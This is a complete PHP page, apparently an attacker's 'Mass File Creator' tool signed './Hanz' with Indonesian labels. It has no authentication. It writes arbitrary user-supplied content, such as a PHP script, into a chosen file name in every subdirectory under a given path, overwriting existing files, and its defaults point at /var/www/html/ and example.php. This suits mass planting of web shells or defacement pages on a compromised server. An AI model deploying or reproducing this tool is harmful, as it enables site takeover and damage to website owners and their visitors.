<?php
set_time_limit(0);
ob_implicit_flush(true);
ob_end_flush();

function sendOutput($text) {
    echo $text . "<br>";
    flush();
    ob_flush();
}

function createFilesRecursively($directory, $filename, $content) {
    $success = 0;
    $fails = 0;

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $fileinfo) {
        if ($fileinfo->isDir()) {
            $filepath = $fileinfo->getPathname() . DIRECTORY_SEPARATOR . $filename;
            if (@file_put_contents($filepath, $content) !== false) {
                $success++;
                sendOutput("<span style='color:lime;'>✔ Created/Overwritten: $filepath</span>");
            } else {
                $fails++;
                sendOutput("<span style='color:red;'>✘ Failed: $filepath</span>");
            }
        }
    }

    return [$success, $fails];
}

$message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $start_dir = rtrim($_POST['start_dir']);
    $filename = trim($_POST['filename']);
    $content = $_POST['content'];

    if (!is_dir($start_dir)) {
        $message = "<p style='color:red'>Directory tidak valid!</p>";
    } else {
        $filename = preg_replace('/[^A-Za-z0-9._-]/', '_', $filename);
        sendOutput("<p style='color:#0ff;'>Mulai proses dari: $start_dir</p>");
        sendOutput("<p style='color:#0ff;'>File target: $filename</p>");
        sendOutput("==========================================");

        list($success, $fails) = createFilesRecursively($start_dir, $filename, $content);

        sendOutput("==========================================");
        sendOutput("<p style='color:yellow;'>SELESAI! Total berhasil: $success | Gagal: $fails</p>");
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Mass File Creator Tools</title>
    <style>
        body { background:#121212; color:#eee; font-family:Arial; padding:20px;}
        input, textarea {
            width:100%; padding:10px; margin:10px 0;
            background:#1e1e1e; color:#fff; border:1px solid #444;
        }
        button {
            background:#4CAF50; border:none;
            padding:12px 22px; cursor:pointer; color:#fff;
            font-size:16px;
        }
        button:hover { background:#43a047; }
        label { font-size:14px; font-weight:bold; margin-top:10px; display:block;}
        .box { max-width:700px; margin:auto; }
    </style>
</head>
<body>
<div class="box">
    <h2>Mass File Creator (Realtime Progress) | By ./Hanz</h2>
    <?= $message ?>

    <form method="post">
        <label>Mulai Dari Directory:</label>
        <input type="text" name="start_dir" placeholder="/var/www/html/" required>

        <label>Nama File:</label>
        <input type="text" name="filename" placeholder="example.php" required>

        <label>Isi File:</label>
        <textarea name="content" rows="15" placeholder="Masukkan teks atau script..." required></textarea>

        <button type="submit">Eksekusi</button>
    </form>
</div>
</body>
</html>
